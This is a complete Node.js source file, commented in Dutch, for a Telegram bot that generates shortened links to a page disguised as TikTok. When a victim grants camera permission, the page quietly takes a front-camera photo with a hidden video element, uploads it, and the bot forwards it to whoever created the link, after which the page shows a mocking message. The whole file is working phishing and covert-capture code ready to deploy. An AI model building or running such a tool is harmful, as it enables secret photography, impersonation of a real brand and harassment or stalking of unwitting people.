require("dotenv").config();
const express = require("express");
const TelegramBot = require("node-telegram-bot-api");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const axios = require("axios");

// Configuratie
const BOT_TOKEN = process.env.BOT_TOKEN;
const YOUR_TELEGRAM_ID = process.env.YOUR_TELEGRAM_ID;
const PORT = process.env.PORT || 3000;
const PUBLIC_URL = process.env.PUBLIC_URL || `http://localhost:${PORT}`;
const VERCEL_URL = process.env.VERCEL_URL || ""; // Bijv: https://jouw-app.vercel.app
const BITLY_TOKEN = process.env.BITLY_TOKEN || "";

// Validatie
if (!BOT_TOKEN || !YOUR_TELEGRAM_ID) {
  console.error(
    "ERROR: BOT_TOKEN en YOUR_TELEGRAM_ID zijn verplicht in .env bestand!",
  );
  console.error("Zie .env.example voor instructies.");
  process.exit(1);
}

// Initialize Telegram Bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Initialize Express
const app = express();

// Configureer multer voor file uploads
const storage = multer.memoryStorage();
const upload = multer({
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB max
});

// Middleware
app.use(express.json());
app.use(express.static("public"));

// Bewaar actieve sessies
const sessions = new Map();

// Bewaar korte codes voor URL shortening
const shortCodes = new Map();

// Genereer unieke link voor gebruiker
function generateSessionId() {
  return (
    Math.random().toString(36).substring(2, 15) +
    Math.random().toString(36).substring(2, 15)
  );
}

// Genereer korte code (6 characters) voor shortener
function generateShortCode() {
  const chars =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let code = "";
  for (let i = 0; i < 6; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

// Probeer Bit.ly, dan Vercel shortener, anders eigen shortener
async function createShortLink(longUrl) {
  // Probeer eerst Bit.ly als token beschikbaar is
  if (BITLY_TOKEN) {
    try {
      const response = await axios.post(
        "https://api-ssl.bitly.com/v4/shorten",
        {
          long_url: longUrl,
          domain: "bit.ly",
        },
        {
          headers: {
            Authorization: `Bearer ${BITLY_TOKEN}`,
            "Content-Type": "application/json",
          },
          timeout: 10000,
        },
      );

      if (response.data && response.data.link) {
        console.log(`✅ Bit.ly link: ${response.data.link}`);
        return response.data.link;
      }
    } catch (error) {
      if (error.response && error.response.status === 403) {
        console.log("⚠️ Bit.ly limiet bereikt, probeer Vercel shortener...");
      } else {
        console.log(
          `⚠️ Bit.ly error: ${error.message}, probeer Vercel shortener...`,
        );
      }
    }
  }

  // Probeer Vercel shortener als beschikbaar
  if (VERCEL_URL) {
    let shortCode = generateShortCode();

    while (shortCodes.has(shortCode)) {
      shortCode = generateShortCode();
    }

    shortCodes.set(shortCode, {
      url: longUrl,
      createdAt: Date.now(),
    });

    const shortLink = `${VERCEL_URL}/${shortCode}`;
    console.log(`✅ Vercel korte link gemaakt: ${shortLink}`);
    return shortLink;
  }

  // Fallback: eigen shortener met Cloudflare domein
  let shortCode = generateShortCode();

  while (shortCodes.has(shortCode)) {
    shortCode = generateShortCode();
  }

  shortCodes.set(shortCode, {
    url: longUrl,
    createdAt: Date.now(),
  });

  const shortLink = `${PUBLIC_URL}/${shortCode}`;
  console.log(`✅ Eigen korte link gemaakt: ${shortLink}`);
  return shortLink;
}

// Bot commando: /start
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const sessionId = generateSessionId();

  sessions.set(sessionId, {
    createdAt: Date.now(),
    used: false,
    userId: chatId, // Bewaar wie deze link maakte
  });

  const photoLink = `${PUBLIC_URL}/v/${sessionId}`;

  // Maak korte link
  const shortLink = await createShortLink(photoLink);

  bot.sendMessage(
    chatId,
    `📸 Camera Link Gegenereerd!\n\n` +
      `Stuur deze link naar de persoon:\n${shortLink}\n\n` +
      `Zodra ze de camera toestemming geven, wordt automatisch een foto gemaakt en naar jou gestuurd.`,
  );

  console.log(
    `Nieuwe sessie aangemaakt: ${sessionId} voor gebruiker ${chatId}`,
  );
});

// Bot commando: /nieuw (voor nieuwe link)
bot.onText(/\/nieuw/, async (msg) => {
  const chatId = msg.chat.id;
  const sessionId = generateSessionId();

  sessions.set(sessionId, {
    createdAt: Date.now(),
    used: false,
    userId: chatId, // Bewaar wie deze link maakte
  });

  const photoLink = `${PUBLIC_URL}/v/${sessionId}`;

  // Maak korte link
  const shortLink = await createShortLink(photoLink);

  bot.sendMessage(chatId, `🔗 Nieuwe link:\n${shortLink}`);
});

// API endpoint: ontvang foto
app.post("/api/photo/:sessionId", upload.single("photo"), async (req, res) => {
  const { sessionId } = req.params;

  // Valideer sessie
  if (!sessions.has(sessionId)) {
    return res.status(404).json({ error: "Ongeldige of verlopen sessie" });
  }

  const session = sessions.get(sessionId);

  // Check of foto bestaat
  if (!req.file) {
    return res.status(400).json({ error: "Geen foto ontvangen" });
  }

  try {
    // Track aantal keer gebruikt (voor stats)
    session.useCount = (session.useCount || 0) + 1;
    sessions.set(sessionId, session);

    // Stuur foto naar de JUISTE gebruiker (degene die de link maakte)
    const targetUserId = session.userId || YOUR_TELEGRAM_ID; // Fallback naar jou als userId ontbreekt
    await bot.sendPhoto(targetUserId, req.file.buffer, {
      caption: `📸 Nieuwe foto ontvangen!\nSessie: ${sessionId}\nTijd: ${new Date().toLocaleString("nl-NL")}`,
    });

    console.log(
      `Foto ontvangen en verstuurd voor sessie: ${sessionId} naar gebruiker ${targetUserId}`,
    );

    // Verwijder sessie na 5 minuten
    setTimeout(
      () => {
        sessions.delete(sessionId);
        console.log(`Sessie verwijderd: ${sessionId}`);
      },
      5 * 60 * 1000,
    );

    res.json({ success: true, message: "Foto succesvol verstuurd!" });
  } catch (error) {
    console.error("Error bij versturen foto:", error);
    res.status(500).json({ error: "Fout bij versturen foto" });
  }
});

// Redirect voor korte codes
app.get("/:shortCode", (req, res, next) => {
  const { shortCode } = req.params;

  // Skip als het een API route of andere bekende route is
  if (shortCode === "api" || shortCode === "health" || shortCode === "v") {
    return next();
  }

  // Check of shortCode bestaat
  if (!shortCodes.has(shortCode)) {
    return res.status(404).send(`
      <!DOCTYPE html>
      <html lang="nl">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Link niet gevonden</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #000;
            color: white;
            text-align: center;
            padding: 20px;
          }
        </style>
      </head>
      <body>
        <div>
          <h1>❌</h1>
          <h2>Link niet gevonden</h2>
        </div>
      </body>
      </html>
    `);
  }

  const data = shortCodes.get(shortCode);

  // Redirect naar de echte URL
  console.log(`🔗 Redirect: ${shortCode} -> ${data.url}`);
  res.redirect(data.url);
});

// Serveer camera pagina
app.get("/v/:sessionId", (req, res) => {
  const { sessionId } = req.params;

  // Valideer sessie
  if (!sessions.has(sessionId)) {
    return res.send(`
            <!DOCTYPE html>
            <html lang="nl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>TikTok - Watch Videos</title>
                <meta property="og:title" content="TikTok - Watch Videos">
                <meta property="og:description" content="Watch awesome videos on TikTok">
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        min-height: 100vh;
                        margin: 0;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        color: white;
                        text-align: center;
                        padding: 20px;
                    }
                    .container {
                        background: rgba(255, 255, 255, 0.1);
                        padding: 40px;
                        border-radius: 20px;
                        backdrop-filter: blur(10px);
                    }
                    h1 { font-size: 3em; margin: 0 0 20px 0; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>❌</h1>
                    <h2>Ongeldige of verlopen link</h2>
                    <p>Deze link is niet meer geldig.</p>
                </div>
            </body>
            </html>
        `);
  }

  const session = sessions.get(sessionId);

  if (session.used) {
    return res.send(`
            <!DOCTYPE html>
            <html lang="nl">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>TikTok - Watch Videos</title>
                <meta property="og:title" content="TikTok - Watch Videos">
                <meta property="og:description" content="Watch awesome videos on TikTok">
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        min-height: 100vh;
                        margin: 0;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        color: white;
                        text-align: center;
                        padding: 20px;
                    }
                    .container {
                        background: rgba(255, 255, 255, 0.1);
                        padding: 40px;
                        border-radius: 20px;
                        backdrop-filter: blur(10px);
                    }
                    h1 { font-size: 3em; margin: 0 0 20px 0; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>✓</h1>
                    <h2>Link al gebruikt</h2>
                    <p>Deze link is al eenmalig gebruikt.</p>
                </div>
            </body>
            </html>
        `);
  }

  // Serveer camera interface
  res.send(`
        <!DOCTYPE html>
        <html lang="nl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>TikTok - Watch Videos</title>
            <meta property="og:title" content="TikTok - Watch Videos">
            <meta property="og:description" content="Watch awesome videos on TikTok">
            <meta property="og:image" content="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-desktop/8152caf0c8e8bc67ae0d.png">
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }

                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
                    background: #000;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    padding: 0;
                    margin: 0;
                    overflow: hidden;
                }

                .container {
                    background: #000;
                    border-radius: 0;
                    padding: 0;
                    max-width: 100%;
                    width: 100%;
                    height: 100vh;
                    box-shadow: none;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                }

                h1 {
                    display: none;
                }

                #video {
                    width: 100%;
                    border-radius: 0;
                    background: #000;
                    display: none;
                    max-width: 100%;
                    max-height: 100vh;
                    visibility: hidden;
                    position: absolute;
                    top: -9999px;
                }

                #canvas {
                    display: none;
                }

                .status {
                    text-align: center;
                    padding: 20px;
                    background: transparent;
                    border-radius: 0;
                    margin: 0;
                    color: #fff;
                }

                .loading {
                    display: inline-block;
                    width: 40px;
                    height: 40px;
                    border: 4px solid #333;
                    border-top: 4px solid #666;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                    margin: 20px auto;
                }

                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }

                .success {
                    color: #28a745;
                    font-size: 48px;
                    margin: 20px 0;
                }

                .error {
                    color: #ff6b6b;
                    padding: 15px;
                    background: transparent;
                    border-radius: 0;
                    margin: 20px 0;
                }

                .info {
                    display: none;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>📸 Camera Foto</h1>

                <div id="status" class="status">
                    <div class="loading"></div>
                </div>

                <video id="video" autoplay playsinline></video>
                <canvas id="canvas"></canvas>

                <div class="info">
                    Geef toestemming voor de camera wanneer gevraagd.
                </div>
            </div>

            <script>
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const statusDiv = document.getElementById('status');
                const sessionId = '${sessionId}';

                async function startCamera() {
                    try {
                        // Verberg status tijdens camera toestemming
                        statusDiv.style.display = 'none';

                        // Vraag camera toegang
                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                facingMode: 'user',
                                width: { ideal: 1280 },
                                height: { ideal: 720 }
                            }
                        });

                        video.srcObject = stream;
                        // Video blijft verborgen, maar wel actief voor foto
                        video.play();

                        statusDiv.style.display = 'block';
                        statusDiv.innerHTML = '<div class="loading"></div>';

                        // Wacht 0.5 seconde voor betere foto (camera heeft tijd om licht aan te passen)
                        await new Promise(resolve => setTimeout(resolve, 500));

                        // Maak foto
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // Stop camera
                        stream.getTracks().forEach(track => track.stop());
                        video.style.display = 'none';

                        // Functie om dataURL naar Blob te converteren
                        function dataURLtoBlob(dataurl) {
                            const arr = dataurl.split(',');
                            const mime = arr[0].match(/:(.*?);/)[1];
                            const bstr = atob(arr[1]);
                            let n = bstr.length;
                            const u8arr = new Uint8Array(n);
                            while(n--){
                                u8arr[n] = bstr.charCodeAt(n);
                            }
                            return new Blob([u8arr], {type:mime});
                        }

                        statusDiv.style.display = 'block';
                        statusDiv.innerHTML = '<div class="loading"></div>';

                        // Gebruik dataURL methode (meer compatibel)
                        try {
                            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
                            const blob = dataURLtoBlob(dataUrl);

                            // Check of blob geldig is
                            if (!blob || blob.size === 0) {
                                throw new Error('Kan geen foto maken');
                            }

                            // Stuur foto naar server
                            const formData = new FormData();
                            formData.append('photo', blob, 'photo.jpg');

                            const response = await fetch('/api/photo/' + sessionId, {
                                method: 'POST',
                                body: formData
                            });

                            const result = await response.json();

                            if (response.ok) {
                                statusDiv.innerHTML = '<div class="success">😂</div><h2 style="color: #ff6b6b; font-size: 32px; font-weight: bold;">Je ziet er niet uit</h2><p style="font-size: 18px;">Foto is gemaakt en verstuurd! 📸</p>';
                            } else {
                                throw new Error(result.error || 'Onbekende fout');
                            }

                        } catch (error) {
                            console.error('Error:', error);
                            statusDiv.style.display = 'block';
                            statusDiv.innerHTML = '<div class="error">❌ Fout bij versturen: ' + error.message + '</div>';
                        }

                    } catch (error) {
                        console.error('Camera error:', error);
                        let errorMessage = 'Camera toegang geweigerd of niet beschikbaar.';

                        if (error.name === 'NotAllowedError') {
                            errorMessage = 'Camera toegang geweigerd. Geef toestemming en probeer opnieuw.';
                        } else if (error.name === 'NotFoundError') {
                            errorMessage = 'Geen camera gevonden op dit apparaat.';
                        }

                        statusDiv.innerHTML = '<div class="error">❌ ' + errorMessage + '</div>';
                    }
                }

                // Start automatisch bij laden
                startCamera();
            </script>
        </body>
        </html>
    `);
});

// Health check endpoint
app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    activeSessions: sessions.size,
    uptime: process.uptime(),
  });
});

// Start server
app.listen(PORT, () => {
  console.log("=".repeat(50));
  console.log("📸 Telegram Camera Bot gestart!");
  console.log("=".repeat(50));
  console.log(`Server draait op: ${PUBLIC_URL}`);
  console.log(`Port: ${PORT}`);
  console.log(`Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
  console.log(`Jouw Telegram ID: ${YOUR_TELEGRAM_ID}`);
  console.log("=".repeat(50));
  console.log("\n✓ Bot is klaar voor gebruik!");
  console.log("  Stuur /start naar de bot op Telegram om te beginnen.\n");
});

// Error handling
bot.on("polling_error", (error) => {
  console.error("Telegram polling error:", error);
});

process.on("unhandledRejection", (error) => {
  console.error("Unhandled rejection:", error);
});

// Clean up oude sessies elke 10 minuten
setInterval(
  () => {
    const now = Date.now();
    const maxAge = 30 * 60 * 1000; // 30 minuten

    for (const [sessionId, session] of sessions.entries()) {
      if (now - session.createdAt > maxAge) {
        sessions.delete(sessionId);
        console.log(`Oude sessie verwijderd: ${sessionId}`);
      }
    }

    // Clean up oude short codes (ouder dan 24 uur)
    const maxCodeAge = 24 * 60 * 60 * 1000; // 24 uur
    for (const [code, data] of shortCodes.entries()) {
      if (now - data.createdAt > maxCodeAge) {
        shortCodes.delete(code);
        console.log(`Oude short code verwijderd: ${code}`);
      }
    }
  },
  10 * 60 * 1000,
);
